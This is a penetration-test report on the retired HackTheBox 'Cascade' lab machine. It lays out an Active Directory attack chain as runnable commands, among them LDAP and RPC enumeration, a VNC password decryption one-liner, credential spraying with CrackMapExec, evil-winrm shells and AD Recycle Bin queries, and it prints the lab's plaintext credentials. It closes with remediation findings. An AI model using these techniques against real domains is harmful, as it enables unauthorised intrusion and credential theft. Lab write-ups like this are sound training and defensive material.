# HTB Cascade - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-16

---

## 0. Lesson Learned

Read ldap enumeration results thoroughly for potential leaked passwords.

Always put `Administrator` in user list for CrackMapExec testing in case of password reuse.

---

## 1. Executive Summary

A penetration test was conducted against the target system hosting the Cascade Active Directory domain. The objective was to obtain user-level and administrative access through exploitation of network services, misconfigurations, and credential exposure.

Initial enumeration revealed an Active Directory environment with exposed LDAP, SMB, RPC, and WinRM services. Anonymous LDAP enumeration allowed extraction of domain user accounts. Further LDAP inspection revealed a custom attribute (`cascadeLegacyPwd`) containing a Base64-encoded credential.

Using this credential, the tester authenticated to SMB shares and discovered internal files containing encrypted credentials. Decryption of a VNC password revealed valid credentials for user s.smith, which allowed remote shell access via WinRM.

Further enumeration of domain shares revealed a SQLite database containing encrypted service credentials. Reverse engineering of a .NET binary (`CascAudit.exe`) revealed the decryption key for these credentials. This allowed recovery of the arksvc service account password.

The arksvc account possessed privileges enabling enumeration of deleted Active Directory objects through the AD Recycle Bin feature. This revealed credentials for the TempAdmin account. The password matched the Administrator account, allowing full administrative access to the domain controller.

The attack chain demonstrates weaknesses in credential storage, improper Active Directory attribute usage, and poor secret management.

---

## 2. Scope

- **Target:** 10.129.231.236
- **Domain:** cascade.local
- **Environment:** HackTheBox Cascade (Retired Machine)
- **Testing Window:** 2026-3-11 to 2016-3-16
- **Objective:** Complete domain compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

Full TCP Port Scan:

```
nmap -p- -sCV 10.129.231.236 -T4 -oA cascade_tcp
```

Key services identified:

- 53/tcp - DNS
- 88/tcp - Kerberos
- 135/tcp - RPC
- 139,445/tcp - SMB
- 389,636/tcp - LDAP
- 3268,3269/tcp - Global Catalog LDAP
- 5985/tcp - WinRM
- 49154-49165/tcp - RPC

The server was identified as Windows Server 2008 R2 SP1.

---

## 5. Enumeration

Anonymous SMB access was tested:

```
smbclient -L //10.129.231.236 -N
```

No accessible shares were identified anonymously.

SMB vulnerability scripts were executed:

```
nmap --script smb-vuln* -p445 10.129.231.236
```

No exploitable SMB vulnerabilities were confirmed.

LDAP naming contexts and users were retrieved.

```
ldapsearch -x -H 10.129.231.236 -s base namingcontexts

ldapsearch -x -H ldap://10.129.231.236 -b "DC=cascade,DC=local" "(objectClass=user)" "sAMAccountName"
```

Anonymous RPC enumeration was performed.

```
rpcclient -U "" -N 10.129.231.236

enumdomusers

enumdomgroups
```

Logon scripts were discovered referencing `MapAuditDrive.vbs`.

---

## 6. Initial Access

LDAP attributes were re-examined for exposed credentials.

```
ldapsearch -x -H ldap://10.129.231.236 -b "DC=cascade,DC=local" "(objectClass=user)"
```

A custom attribute (`cascadeLegacyPwd`) was discovered for user `r.thompson`.

The value was Base64 encoded.

```
echo 'clk0bjVldmE=' | base64 -d
```

Recovered credentials:

```
r.thompson : rY4n5eva
```

Credential validation:

```
crackmapexec smb 10.129.231.236 -u r.thompson -p 'rY4n5eva'
```

---

## 7. Post-Exploitation

Authenticated SMB enumeration:

```
smbclient -L //10.129.231.236 -U r.thompson
```

Access to the Data share was identified and files downloaded:

```
smbclient //10.129.231.236/Data -U r.thompson%rY4n5eva

cd IT

recurse ON

mget *
```

A file was discovered containing a VNC registry configuration.

```
\Data\IT\Temp\s.smith\VNC Install.reg
```

The password was decrypted using the VNC decryption one-liner:

```
echo -n '6bcf2a4b6e5aca0f' | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
```

Recovered credentials:

```
s.smith : sT333ve2
```

Credential validation:

```
crackmapexec winrm 10.129.231.236 -u users.txt -p passwords.txt --continue-on-success
```

BloodHound Enumeration executed.

```
bloodhound-python -d cascade.local -u s.smith -p 'sT333ve2' -ns 10.129.231.236 -c All --zip
```

No viable shortest path to Domain Admin noted.

WinRM access confirmed and shell obtained:

```
evil-winrm -i 10.129.231.236 -u s.smith -p 'sT333ve2'
```

User flag retrieved.

---

## 8. Privilege Escalation

Additional shares were enumerated.

```
smbclient //10.129.231.236/Audit$ -U s.smith%sT333ve2
```

A database (`Audit.db`) was discovered and inspected with SQLite:

```
file Audit.db

sqlite3 Audit.db

.tables

select * from ldap;
```

Encrypted credentials `BQO5l5Kj9MdErXx6Q6AGOw==` did not Base64 decode.

The binary `CascAudit.exe` was discovered and identified as .NET assembly.

```
file CascAudit.exe

ilspycmd CascAudit.exe -o casc_src

grep -RinE 'password|ldap|DirectoryEntry|DirectorySearcher|cascadeLegacyPwd' casc_src
```

Decryption key discovered:

```
c4scadek3y654321
```

Debugging revealed the decrypted password:

```
w3lc0meFr31nd
```

Recovered credentials:

```
arksvc : w3lc0meFr31nd
```

Shell obtained:

```
evil-winrm -i 10.129.231.236 -u arksvc -p 'w3lc0meFr31nd'
```

Group membership identified the account possessed privileges related to AD Recycle Bin.:

```
whoami /groups
```

Deleted objects were queried.

```
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Recovered credential:

```
TempAdmin : YmFDVDNyMWFOMDBkbGVz
```

Decoded:

```
echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
```

Credential testing:

```
crackmapexec winrm 10.129.231.236 -u Administrator -p passwords.txt --continue-on-success
```

Administrator credentials confirmed.

Shell obtained:

```
evil-winrm -i 10.129.231.236 -u Administrator -p 'baCT3r1aN00dles'
```

Root flag retrieved.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\s.smith\Desktop\user.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\root.txt
```

This confirms full domain compromise.

---

## 10. Findings & Recommendations

### **Finding:** Plaintext Password Stored in LDAP Attribute

**Severity:** Critical

**Description:**
A domain user password was stored in plaintext within an Active Directory attribute (such as the description field), making it accessible to authenticated users.

**Impact:**
Attackers could retrieve the exposed credential and use it to authenticate as the affected user, potentially leading to privilege escalation or lateral movement.

**Recommendation:**
Prohibit storage of credentials in Active Directory attributes, implement auditing for sensitive attribute exposure, and perform credential rotation for affected accounts.

### **Finding:** Sensitive Data Stored Insecurely

**Severity:** High

**Description:**
Sensitive files or credentials were stored in accessible locations.

**Impact:**
Attackers could retrieve confidential data and escalate privileges.

**Recommendation:**
Restrict file permissions, use centralized secret storage, and conduct regular audits.

### **Finding:** Hardcoded Cryptographic Key in Application Binary

**Severity:** High

**Description:**
An application binary contained a hardcoded cryptographic key used for protecting sensitive data.

**Impact:**
Attackers could extract the embedded key and decrypt protected information or bypass application security mechanisms.

**Recommendation:**
Avoid embedding cryptographic keys in application code, use secure key management solutions, and rotate any exposed keys immediately.

### **Finding:** Credential Reuse Across Services

**Severity:** High

**Description:**
The same credentials were used across multiple services.

**Impact:**
Compromise of one service could lead to compromise of additional services.

**Recommendation:**
Enforce unique credentials per service and implement credential rotation policies.

---

## 11. Appendix

RPC Enumeration Commands -
[https://www.hackingarticles.in/active-directory-enumeration-rpcclient/](https://www.hackingarticles.in/active-directory-enumeration-rpcclient/)

Decrypting VNC Passwords - 
[https://github.com/billchaison/VNCDecrypt](https://github.com/billchaison/VNCDecrypt)

VNC Password Decryption One-Liner -

```
echo -n 'VNC_PASSWORD' | xxd -r -p  | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
```

AD Recycle Bin Group Membership Exploit -
[https://github.com/ivanversluis/pentest-hacktricks/blob/master/windows/active-directory-methodology/privileged-accounts-and-token-privileges.md](https://github.com/ivanversluis/pentest-hacktricks/blob/master/windows/active-directory-methodology/privileged-accounts-and-token-privileges.md)

AD Recycle Bin Exploit One-Liner -

```
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```